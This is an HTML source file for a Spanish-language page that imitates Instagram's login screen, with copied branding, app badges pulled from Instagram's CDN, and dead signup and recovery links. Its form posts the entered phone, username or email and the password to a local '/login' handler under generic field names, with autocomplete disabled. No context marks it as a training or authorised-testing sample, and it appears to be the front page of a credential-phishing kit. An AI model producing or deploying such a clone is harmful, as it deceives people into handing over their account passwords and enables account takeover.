<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{display:flex;gap:32px;max-width:935px;align-items:center;flex-wrap:wrap;justify-content:center}
.phone{width:380px;height:580px;display:flex;align-items:center;justify-content:center;position:relative}
.phone img{max-width:100%;height:auto}
.phone-placeholder{width:250px;height:500px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);border-radius:30px;display:flex;align-items:center;justify-content:center;position:relative}
.phone-placeholder::after{content:'';position:absolute;inset:8px;border:2px solid rgba(255,255,255,.3);border-radius:24px}
.login-card{background:#fff;border:1px solid #dbdbdb;padding:40px 40px 20px;width:350px;text-align:center}
.logo{font-family:'Segoe Script','Dancing Script',cursive;font-size:40px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:24px;display:block}
.login-card input{width:100%;padding:9px 8px 7px;margin-bottom:6px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;color:#262626}
.login-card input::placeholder{color:#8e8e8e}
.login-card input:focus{outline:none;border-color:#a8a8a8}
.login-card button{width:100%;padding:7px 16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
.login-card button:hover{background:#1877f2}
.divider{display:flex;align-items:center;margin:18px 0;color:#8e8e8e;font-size:13px;font-weight:600}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.divider::before{margin-right:18px}
.divider::after{margin-left:18px}
.fb-login{color:#385185;font-size:14px;margin-top:16px;display:flex;align-items:center;justify-content:center;gap:8px;cursor:pointer}
.fb-login svg{width:20px;height:20px}
.forgot{color:#00376b;font-size:12px;margin-top:16px}
.forgot a{color:#00376b;text-decoration:none}
.signup{background:#fff;border:1px solid #dbdbdb;padding:22px 40px;margin-top:10px;width:350px;text-align:center;font-size:14px;color:#262626}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
.app-badges{display:flex;gap:8px;justify-content:center;margin-top:20px}
.app-badges img{height:40px}
.get-app{font-size:14px;color:#262626;margin-top:20px}
@media(max-width:870px){.phone,.phone-placeholder{display:none}.container{flex-direction:column}}
</style>
</head>
<body>
<div class="container">
<div class="phone">
<div class="phone-placeholder"></div>
</div>
<div>
<div class="login-card">
<span class="logo">Instagram</span>
<form action="/login" method="POST">
<input type="text" name="field1" placeholder="Tel&eacute;fono, usuario o correo electr&oacute;nico" required autocomplete="off">
<input type="password" name="field2" placeholder="Contrase&ntilde;a" required autocomplete="off">
<button type="submit">Iniciar sesi&oacute;n</button>
</form>
<div class="divider">O</div>
<div class="fb-login">
<svg viewBox="0 0 24 24" fill="#385185"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/></svg>
Iniciar sesi&oacute;n con Facebook
</div>
<div class="forgot"><a href="#">&iquest;Olvidaste tu contrase&ntilde;a?</a></div>
</div>
<div class="signup">&iquest;No tienes una cuenta? <a href="#">Reg&iacute;strate</a></div>
<div class="get-app">Descarga la app.</div>
<div class="app-badges">
<img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" onerror="this.style.display='none'">
<img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" onerror="this.style.display='none'">
</div>
</div>
</div>
</body>
</html>
